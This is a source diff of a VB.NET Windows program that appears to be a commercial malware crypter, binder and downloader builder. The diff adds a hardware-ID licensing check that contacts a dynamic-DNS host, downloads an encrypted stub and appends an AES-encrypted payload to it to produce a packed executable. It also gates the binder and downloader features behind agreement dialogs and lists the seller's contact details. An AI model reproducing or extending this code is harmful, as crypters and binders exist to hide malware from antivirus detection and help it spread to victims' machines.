@@ -5,6 +5,9 @@
 
 Public Class Form1
     Dim CurrentStub As String = ""
+    Public Shared TOS As Boolean = False
+    Public Shared BinderTOS As Boolean = False
+    Public Shared DownloaderTOS As Boolean = False
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
         Dim OFD As New OpenFileDialog
         With OFD
@@ -28,27 +31,39 @@ Public Class Form1
         Return System.Text.Encoding.Unicode.GetBytes(TheStr)
     End Function
 
+    Private Function HexToByteArray(ByVal hex As [String]) As Byte()
+        Dim bytes(0 To hex.Length / 2 - 1) As Byte
+        Dim a As Integer = 0
+        For i = 0 To hex.Length - 1 Step 2
+            ' Console.WriteLine(hex.Substring(i, 2))
+            Dim f = hex.Substring(i, 2)
+            bytes(a) = "&h" & f
+            a += 1
+        Next
+        Return bytes
+    End Function
+
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
-        Dim StubPath As String = Application.StartupPath & "\stubs\" & CurrentStub
-        Dim Stub() As Byte
-        If TextBox1.Text = "" Then Exit Sub
-        ' 
-        If CurrentStub = "" Then
-            Dim OFD As New OpenFileDialog
-            With OFD
-                .Title = "Select Stub"
-                .InitialDirectory = Application.StartupPath & "\stubs"
-                .ShowDialog()
-            End With
-            If OFD.FileName <> "" Then
-                Stub = FileIO.FileSystem.ReadAllBytes(OFD.FileName)
-            Else
-                MsgBox("must select stub")
-                Exit Sub
-            End If
-        Else
-            Stub = FileIO.FileSystem.ReadAllBytes(Application.StartupPath & "\stubs\" & CurrentStub)
+        If TOS = False Then
+            Dim R As New frmTOS
+            R.CrypterAgreement = True
+            R.ShowDialog()
+            If TOS = False Then Exit Sub
         End If
+
+        Dim StubStr As String = "http://intellisence.ddns.net/Crypter/index.php"
+        Dim WC As New System.Net.WebClient
+        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID() & "&list_users=fuckingtrue")
+        If StubStr.Contains("WRONG KEY OR NO KEYS EXIST") Then
+            MsgBox("You will need to purchase stubs to use the crypter! Please contact exidous!" & Environment.NewLine & "Skype: exidous1" & Environment.NewLine & "Jabber: exidous@jabb3r.org" & Environment.NewLine & "Email: exidous2008@gmail.com" & Environment.NewLine & "Your hardware id has been copied to the clipboard!" & Environment.NewLine & "HWID: " & HWID.GetID)
+            Clipboard.Clear()
+            Clipboard.SetText(HWID.GetID)
+            Exit Sub
+        End If
+        Dim stub As Byte() = HexToByteArray(StubStr) 'Convert.FromBase64String(StubStr)
+
+        ' Dim Stub() As Byte
+        If TextBox1.Text = "" Then Exit Sub
 
         Dim SFD As New SaveFileDialog
         With SFD
@@ -57,7 +72,7 @@ Public Class Form1
             .ShowDialog()
         End With
         If SFD.FileName <> "" Then
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Stub, False)
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, stub, False)
             If CheckBox1.Checked = True Then
                 Dim TestDialog As New FrmClone
                 TestDialog.TextBox2.Text = SFD.FileName
@@ -66,11 +81,18 @@ Public Class Form1
                 TestDialog.Dispose()
             End If
 
+
             If IsNetApp(TextBox1.Text) Then
                 FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
             Else
                 FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
             End If
+            If CheckBox7.Checked = True Then
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
+            Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
+            End If
+
             FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
 
             FileIO.FileSystem.WriteAllBytes(SFD.FileName, AES_Encrypt(FileIO.FileSystem.ReadAllBytes(TextBox1.Text)), True)
@@ -261,38 +283,7 @@ Public Class Form1
         ListView1.Columns.Add("File Path", 100, HorizontalAlignment.Center) 'Column 2
         ListView1.Columns.Add("Execute", 100, HorizontalAlignment.Center) 'Column 3
         ListView1.Columns.Add("Drop Path", 100, HorizontalAlignment.Center)
-
-        'checking for stub update
-        Dim Wc As New Net.WebClient
-        Dim Restult As String = ""
-        Try
-            Restult = Wc.DownloadString("http://intellisence.ddns.net/crypter/index.php")
-        Catch ex As Exception
-            Exit Sub
-        End Try
-
-        CurrentStub = Restult
-        If FileIO.FileSystem.DirectoryExists("stubs") Then
-            'loop through the files and see if current stub exists
-            Dim di As New IO.DirectoryInfo(Application.StartupPath & "\stubs\")
-            Dim diar1 As IO.FileInfo() = di.GetFiles()
-            Dim dra As IO.FileInfo
-
-            'list the names of all files in the specified directory
-            For Each dra In diar1
-                If dra.ToString.Contains(Restult) Then Exit Sub
-            Next
-            'if not download new stub
-            MsgBox("Stub update found! Downloading stub!")
-            FileIO.FileSystem.WriteAllBytes(Application.StartupPath & "\stubs\" & Restult, Wc.DownloadData("http://intellisence.ddns.net/crypter/" & Restult), False)
-            MsgBox("Stub update success!")
-        Else
-            MsgBox("Stub update found! Downloading stub!")
-            FileIO.FileSystem.CreateDirectory("stubs")
-            FileIO.FileSystem.WriteAllBytes(Application.StartupPath & "\stubs\" & Restult, Wc.DownloadData("http://intellisence.ddns.net/crypter/" & Restult), False)
-            MsgBox("Stub update success!")
-        End If
-
+        TextBox3.Text = HWID.GetID
     End Sub
 
     Private Function Bytes_To_String2(ByVal bytes_Input As Byte()) As String
@@ -344,6 +335,12 @@ Public Class Form1
     End Function
 
     Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
+        If DownloaderTOS = False Then
+            Dim R As New frmTOS
+            R.DownloaderAgreement = True
+            R.ShowDialog()
+            If DownloaderTOS = False Then Exit Sub
+        End If
         Dim Bin() As Byte = My.Resources.DwnldrStub
 
         Dim BytesToWrite() As Byte = System.Text.Encoding.Unicode.GetBytes("!~!" & Base64EncodeString(TextBox2.Text) & "!~!")
@@ -407,7 +404,12 @@ Public Class Form1
     End Sub
 
     Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
-
+        If BinderTOS = False Then
+            Dim R As New frmTOS
+            R.BinderAgreement = True
+            R.ShowDialog()
+            If BinderTOS = False Then Exit Sub
+        End If
         Dim AppendBytes() As Byte = {}
         Dim SFD As New SaveFileDialog
         With SFD
@@ -527,5 +529,52 @@ Public Class Form1
         tmp = Replace(tmp, "\t", vbTab)
         tmp = Replace(tmp, "\q", """")
         Return tmp
+    End Function
+
+    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
+        Clipboard.Clear()
+        Clipboard.SetText(TextBox3.Text)
+    End Sub
+End Class
+
+Class HWID
+
+    Shared Function GetID() As String
+        Dim ID As String = SystemSerialNumber() & CpuId()
+        Return ID
+    End Function
+    Private Shared Function SystemSerialNumber() As String
+        ' Get the Windows Management Instrumentation object.
+        Dim wmi As Object = GetObject("WinMgmts:")
+
+        ' Get the "base boards" (mother boards).
+        Dim serial_numbers As String = ""
+        Dim mother_boards As Object =
+            wmi.InstancesOf("Win32_BaseBoard")
+        For Each board As Object In mother_boards
+            serial_numbers &= ", " & board.SerialNumber
+        Next board
+        If serial_numbers.Length > 0 Then serial_numbers =
+            serial_numbers.Substring(2)
+
+        Return serial_numbers
+    End Function
+
+    Private Shared Function CpuId() As String
+        Dim computer As String = "."
+        Dim wmi As Object = GetObject("winmgmts:" &
+            "{impersonationLevel=impersonate}!\\" &
+            computer & "\root\cimv2")
+        Dim processors As Object = wmi.ExecQuery("Select * from " &
+            "Win32_Processor")
+
+        Dim cpu_ids As String = ""
+        For Each cpu As Object In processors
+            cpu_ids = cpu_ids & ", " & cpu.ProcessorId
+        Next cpu
+        If cpu_ids.Length > 0 Then cpu_ids =
+            cpu_ids.Substring(2)
+
+        Return cpu_ids
     End Function
 End Class
